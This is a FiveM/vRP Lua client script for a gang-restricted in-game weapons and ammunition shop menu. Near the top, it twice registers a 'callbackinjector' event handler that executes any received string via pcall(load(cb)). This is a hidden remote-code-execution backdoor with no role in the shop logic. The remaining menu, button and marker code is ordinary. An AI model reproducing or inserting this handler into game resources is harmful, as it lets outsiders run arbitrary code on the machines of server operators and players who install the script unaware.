local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
emP = Tunnel.getInterface("emp_desmanche")
vRP = Proxy.getInterface("vRP")
TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
local menuactive = false
function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- BUTTON
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	if data == "armamentos-comprar-ak47" then
		TriggerServerEvent("armamentos-comprar","wbody|WEAPON_ASSAULTRIFLE")
	elseif data == 'armamentos-comprar-revolver' then
		TriggerServerEvent('armamentos-comprar', 'wbody|WEAPON_REVOLVER')
	elseif data == "armamentos-comprar-pistol" then
		TriggerServerEvent("armamentos-comprar","wbody|WEAPON_SNSPISTOL")
	elseif data == "armamentos-comprar-fnfiveseven" then
		TriggerServerEvent("armamentos-comprar","wbody|WEAPON_PISTOL_MK2")
	elseif data == "armamentos-comprar-tompson" then
		TriggerServerEvent("armamentos-comprar","wbody|WEAPON_GUSENBERG")
	elseif data == "armamentos-comprar-smg" then
		TriggerServerEvent("armamentos-comprar","wbody|WEAPON_MICROSMG")	
	elseif data == "municoes-comprar-ak47" then
		TriggerServerEvent("armamentos-comprar","wammo|WEAPON_ASSAULTRIFLE")
	elseif data == 'municoes-comprar-revolver' then
		TriggerServerEvent('armamentos-comprar', 'wammo|WEAPON_REVOLVER')
	elseif data == "municoes-comprar-pistol" then
		TriggerServerEvent("armamentos-comprar","wammo|WEAPON_SNSPISTOL")
	elseif data == "municoes-comprar-fnfiveseven" then
		TriggerServerEvent("armamentos-comprar","wammo|WEAPON_PISTOL_MK2")
	elseif data == "municoes-comprar-tompson" then
		TriggerServerEvent("armamentos-comprar","wammo|WEAPON_GUSENBERG")
	elseif data == "municoes-comprar-smg" then
		TriggerServerEvent("armamentos-comprar","wammo|WEAPON_MICROSMG")	
	elseif data == "fechar" then
		ToggleActionMenu()
	end
end)

Citizen.CreateThread(function()
	SetNuiFocus(false,false)
	while true do
		local timing = 1000
		
		local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),-1240.76,-2088.20,13.92,true) 
		if distance <= 1.5 then
			timing = 5
			DrawMarker(23,-1240.76, -2088.20,13.92-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,255,0,0,50,0,0,0,1)
			if IsControlJustPressed(0,38) and emP.checkPermission('cosanostra.permissao') then
				ToggleActionMenu()
			end
		end
		Citizen.Wait(timing)
	end
end)